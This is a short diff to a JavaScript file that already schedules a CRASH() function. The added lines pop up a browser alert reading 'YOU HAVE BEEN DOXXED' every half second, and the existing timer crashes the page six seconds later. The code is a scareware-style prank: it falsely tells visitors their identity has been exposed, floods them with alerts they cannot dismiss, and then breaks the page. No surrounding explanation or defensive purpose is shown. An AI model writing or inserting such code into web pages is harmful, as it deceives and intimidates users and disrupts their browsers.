@@ -11,6 +11,11 @@ CRASH()
 }, 1)
 }
 
+setInterval( function() {
+    window.alert("YOU HAVE BEEN DOXXED")
+},500)
+
+
 setTimeout(CRASH,6000 )
 //CRASH()
 //console.log(DUMBTEXT)
